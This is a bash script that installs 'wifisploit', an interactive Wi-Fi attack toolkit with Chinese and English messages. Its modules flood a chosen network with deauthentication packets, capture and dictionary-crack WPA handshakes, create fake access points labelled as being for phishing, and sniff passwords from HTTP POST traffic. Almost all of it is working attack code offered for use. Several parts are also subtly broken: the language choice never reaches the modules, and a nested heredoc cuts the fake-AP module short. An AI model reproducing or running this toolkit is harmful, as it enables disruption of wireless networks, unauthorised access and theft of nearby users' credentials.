#!/bin/bash

# 创建目录结构
mkdir -p wifisploit/modules

# 选择语言
echo "请选择安装语言 / Please select the installation language:"
echo "1) 中文"
echo "2) English"
read -p "选择语言 (1/2): " LANGUAGE

if [ "$LANGUAGE" -eq 1 ]; then
  LANG_SUFFIX="_zh"
else
  LANG_SUFFIX=""
fi

# 创建 set_monitor_mode.sh
cat << 'EOF' > wifisploit/modules/set_monitor_mode.sh
#!/bin/bash

INTERFACE=$1

if [ -z "$INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "Usage: $0 <interface>"
  else
    echo "Usage: $0 <interface>"
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "将$INTERFACE设置为监听模式..."
else
  echo "Setting $INTERFACE to monitor mode..."
fi

airmon-ng start $INTERFACE

MONITOR_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E "^mon")

if [ -z "$MONITOR_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未能成功将网卡设置为监听模式，请检查网卡及airmon-ng工具的状态。"
  else
    echo "Failed to set the network card to monitor mode. Please check the status of the network card and airmon-ng tool."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "$INTERFACE 已设置为监听模式 $MONITOR_INTERFACE"
else
  echo "$INTERFACE has been set to monitor mode $MONITOR_INTERFACE"
fi

echo $MONITOR_INTERFACE > /tmp/current_monitor_interface
EOF

# 创建 scan_networks.sh
cat << 'EOF' > wifisploit/modules/scan_networks.sh
#!/bin/bash

MONITOR_INTERFACE=$(cat /tmp/current_monitor_interface)

if [ -z "$MONITOR_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先将网卡设置为监听模式。"
  else
    echo "Please set the network card to monitor mode first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始扫描周围网络..."
else
  echo "Starting to scan surrounding networks..."
fi

airodump-ng $MONITOR_INTERFACE > /tmp/network_scan.txt &

sleep 10  # 扫描10秒

kill $!

# 显示扫描结果并让用户选择目标
awk 'BEGIN{print "编号\tBSSID\t\t\t频道\t加密\t信号\tSSID"}
     /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {
         printf "%d\t%s\t%s\t%s\t%s\t%s\n", NR, $1, $6, $8, $4, $14
     }' /tmp/network_scan.txt

if [ "$LANG_SUFFIX" == "_zh" ]; then
  read -p "选择目标网络的编号: " TARGET_NUMBER
else
  read -p "Select the target network number: " TARGET_NUMBER
fi

TARGET_BSSID=$(awk -v num=$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print $2}' /tmp/network_scan.txt)
TARGET_CHANNEL=$(awk -v num=$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print $3}' /tmp/network_scan.txt)

echo $TARGET_BSSID > /tmp/current_target_bssid
echo $TARGET_CHANNEL > /tmp/current_target_channel

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "已选择目标网络: BSSID=$TARGET_BSSID, 频道=$TARGET_CHANNEL"
else
  echo "Selected target network: BSSID=$TARGET_BSSID, Channel=$TARGET_CHANNEL"
fi
EOF

# 创建 dos_attack.sh
cat << 'EOF' > wifisploit/modules/dos_attack.sh
#!/bin/bash

MONITOR_INTERFACE=$(cat /tmp/current_monitor_interface)
TARGET_BSSID=$(cat /tmp/current_target_bssid)

if [ -z "$MONITOR_INTERFACE" ] || [ -z "$TARGET_BSSID" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先选择目标网络。"
  else
    echo "Please select the target network first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始对目标网络进行Dos攻击..."
else
  echo "Starting Dos attack on the target network..."
fi

aireplay-ng --deauth 0 -a $TARGET_BSSID $MONITOR_INTERFACE
EOF

# 创建 capture_handshake.sh
cat << 'EOF' > wifisploit/modules/capture_handshake.sh
#!/bin/bash

MONITOR_INTERFACE=$(cat /tmp/current_monitor_interface)
TARGET_BSSID=$(cat /tmp/current_target_bssid)
TARGET_CHANNEL=$(cat /tmp/current_target_channel)

if [ -z "$MONITOR_INTERFACE" ] || [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "请先选择目标网络。"
  else
    echo "Please select the target network first."
  fi
  exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始对目标网络进行监视以查找连接的设备..."
else
  echo "Starting to monitor the target network to find connected devices..."
fi

airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write capture --output-format csv $MONITOR_INTERFACE &

AIRODUMP_PID=$!

sleep 10  # 监视10秒以查找连接的设备

kill $AIRODUMP_PID

# 检查是否找到连接的设备
CLIENT_MACS=$(awk -F, '/Station MAC/ {found=1} found && $1 ~ /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print $1}' capture-01.csv)

if [ -z "$CLIENT_MACS" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未找到连接到目标网络的设备。"
  else
    echo "No devices connected to the target network found."
  fi
  exit 1
fi

# 随机选择一台设备进行踢出
CLIENT_MAC=$(echo "$CLIENT_MACS" | shuf -n 1)

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "踢出目标网络中的设备 $CLIENT_MAC 以获取握手包..."
else
  echo "Kicking out device $CLIENT_MAC from the target network to capture the handshake..."
fi

aireplay-ng --deauth 5 -a $TARGET_BSSID -c $CLIENT_MAC $MONITOR_INTERFACE

# 继续监视目标网络以捕获握手包
airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write capture $MONITOR_INTERFACE &

AIRODUMP_PID=$!

sleep 10  # 继续监视10秒

kill $AIRODUMP_PID

# 检查是否已捕获到握手包
if [ -f capture-01.cap ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "成功捕获到握手包，保存在 capture-01.cap"
  else
    echo "Successfully captured the handshake, saved in capture-01.cap"
  fi
else
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未捕获到握手包，请重试或检查目标网络状态。"
  else
    echo "Failed to capture the handshake, please try again or check the status of the target network."
  fi
  exit 1
fi
EOF

# 创建 crack_handshake.sh
cat << 'EOF' > wifisploit/modules/crack_handshake.sh
#!/bin/bash

CAPTURE_FILE="capture-01.cap"
TARGET_BSSID=$(cat /tmp/current_target_bssid)
DICTIONARY_PATH=$1

if [ -z "$DICTIONARY_PATH" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "Usage: $0 <dictionary_path>"
  else
    echo "Usage: $0 <dictionary_path>"
  fi
  exit 1
fi

if [ ! -f "$CAPTURE_FILE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "捕获文件不存在，请检查路径后重试。"
  else
    echo "Capture file not found, please check the path and try again."
  fi
  exit 1
fi

if [ ! -f "$DICTIONARY_PATH" ]; then
     if [ "$LANG_SUFFIX" == "_zh" ]; then
      echo "字典文件不存在，请检查路径后重试。"
    else
      echo "Dictionary file not found, please check the path and try again."
    fi
    exit 1
fi

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "开始使用$DICTIONARY_PATH进行暴力破解..."
else
  echo "Starting brute-force attack using $DICTIONARY_PATH..."
fi

aircrack-ng -w $DICTIONARY_PATH -b $TARGET_BSSID $CAPTURE_FILE
EOF

# 创建 show_target.sh
cat << 'EOF' > wifisploit/modules/show_target.sh
#!/bin/bash

TARGET_BSSID=$(cat /tmp/current_target_bssid 2>/dev/null)
TARGET_CHANNEL=$(cat /tmp/current_target_channel 2>/dev/null)

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "未选择目标网络。"
  else
    echo "No target network selected."
  fi
else
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "当前目标网络: BSSID=$TARGET_BSSID, 频道=$TARGET_CHANNEL"
  else
    echo "Current target network: BSSID=$TARGET_BSSID, Channel=$TARGET_CHANNEL"
  fi
fi
EOF

# 创建 create_fake_ap.sh
cat << 'EOF' > wifisploit/modules/create_fake_ap.sh
#!/bin/bash

FAKE_SSID=$1
NUM_APS=$2

if [ -z "$FAKE_SSID" ] || [ -z "$NUM_APS" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "Usage: $0 <fake_ssid> <number_of_aps>"
  else
    echo "Usage: $0 <fake_ssid> <number_of_aps>"
  fi
  exit 1
fi

# 创建 hostapd 和 dnsmasq 配置文件目录
mkdir -p /tmp/wifisploit/fake_ap

# 生成多个 AP 配置
for i in $(seq 1 $NUM_APS); do
  FAKE_AP_SSID="${FAKE_SSID}_${i}"
  FAKE_AP_INTERFACE="fake_ap_${i}"
  
  # 创建 hostapd 配置文件
  cat << EOF > /tmp/wifisploit/fake_ap/hostapd_$i.conf
interface=$FAKE_AP_INTERFACE
driver=nl80211
ssid=$FAKE_AP_SSID
hw_mode=g
channel=1
EOF

  # 创建 dnsmasq 配置文件
  cat << EOF > /tmp/wifisploit/fake_ap/dnsmasq_$i.conf
interface=$FAKE_AP_INTERFACE
dhcp-range=10.0.0.2,10.0.0.10,255.255.255.0,12h
EOF

  # 创建网络接口
  ip link set dev $FAKE_AP_INTERFACE up

  # 启动 hostapd
  hostapd /tmp/wifisploit/fake_ap/hostapd_$i.conf -B

  # 启动 dnsmasq
  dnsmasq -C /tmp/wifisploit/fake_ap/dnsmasq_$i.conf
done

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "成功创建 $NUM_APS 个假 AP，SSID 基于 $FAKE_SSID"
else
  echo "Successfully created $NUM_APS fake APs, SSID based on $FAKE_SSID"
fi
EOF

# 创建 collect_credentials.sh
cat << 'EOF' > wifisploit/modules/collect_credentials.sh
#!/bin/bash

FAKE_AP_INTERFACE=$1

if [ -z "$FAKE_AP_INTERFACE" ]; then
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "Usage: $0 <fake_ap_interface>"
  else
    echo "Usage: $0 <fake_ap_interface>"
  fi
  exit 1
fi

# 使用 tcpdump 捕获并显示 HTTP POST 请求中的密码
tcpdump -i $FAKE_AP_INTERFACE -A 'tcp port 80 and (((ip[2:2] - ((ip[0] & 0xf) << 2)) - ((tcp[12] & 0xf0) >> 2)) != 0)' | grep -i 'password'
EOF

# 创建 wifisploit.sh
cat << 'EOF' > wifisploit/wifisploit.sh
#!/bin/bash

function show_help {
  if [ "$LANG_SUFFIX" == "_zh" ]; then
    echo "Commands:"
    echo "  set_monitor_mode (smm) <interface>       将指定网卡设置为监听模式"
    echo "  scan_networks (sn)                       扫描周围的无线网络"
    echo "  dos_attack (da)                          对当前目标网络进行Dos攻击"
    echo "  capture_handshake (ch)                   捕获当前目标网络的握手包"
    echo "  crack_handshake (crh) <dictionary_path>  使用字典文件破解握手包"
    echo "  create_fake_ap (cfa) <ssid> <num_aps>    创建假 Wi-Fi 热点进行钓鱼"
    echo "  collect_credentials (cc) <interface>     显示假 AP 收集到的密码"
    echo "  show_target (st)                         显示当前选择的目标网络"
    echo "  help (h)                                 显示此帮助信息"
    echo "  exit (e)                                 退出交互模式"
  else
    echo "Commands:"
    echo "  set_monitor_mode (smm) <interface>       Set the specified network card to monitor mode"
    echo "  scan_networks (sn)                       Scan the surrounding wireless networks"
    echo "  dos_attack (da)                          Perform a Dos attack on the current target network"
    echo "  capture_handshake (ch)                   Capture the handshake of the current target network"
    echo "  crack_handshake (crh) <dictionary_path>  Crack the handshake using a dictionary file"
    echo "  create_fake_ap (cfa) <ssid> <num_aps>    Create fake Wi-Fi hotspots for phishing"
    echo "  collect_credentials (cc) <interface>     Display the passwords collected by the fake AP"
    echo "  show_target (st)                         Display the currently selected target network"
    echo "  help (h)                                 Display this help information"
    echo "  exit (e)                                 Exit the interactive mode"
  fi
}

function main_menu {
  while true; do
    echo -n "wifisploit> "
    read -r CMD ARGS

    case "$CMD" in
      set_monitor_mode|smm)
        modules/set_monitor_mode.sh $ARGS
        ;;
      scan_networks|sn)
        modules/scan_networks.sh
        ;;
      dos_attack|da)
        modules/dos_attack.sh
        ;;
      capture_handshake|ch)
        modules/capture_handshake.sh
        ;;
      crack_handshake|crh)
        modules/crack_handshake.sh $ARGS
        ;;
      create_fake_ap|cfa)
        modules/create_fake_ap.sh $ARGS
        ;;
      collect_credentials|cc)
        modules/collect_credentials.sh $ARGS
        ;;
      show_target|st)
        modules/show_target.sh
        ;;
      help|h)
        show_help
        ;;
      exit|e)
        break
        ;;
      *)
        if [ "$LANG_SUFFIX" == "_zh" ]; then
          echo "未知命令: $CMD"
        else
          echo "Unknown command: $CMD"
        fi
        show_help
        ;;
    esac
  done
}

# 显示帮助信息并进入主菜单
show_help
main_menu
EOF

# 设置脚本执行权限
chmod +x wifisploit/modules/*.sh
chmod +x wifisploit/wifisploit.sh

if [ "$LANG_SUFFIX" == "_zh" ]; then
  echo "wifisploit 工具已成功部署。"
  echo "使用方法：进入 wifisploit 目录并运行 ./wifisploit.sh 进入交互模式。"
else
  echo "wifisploit tool has been successfully deployed."
  echo "Usage: Enter the wifisploit directory and run ./wifisploit.sh to enter interactive mode."
fi
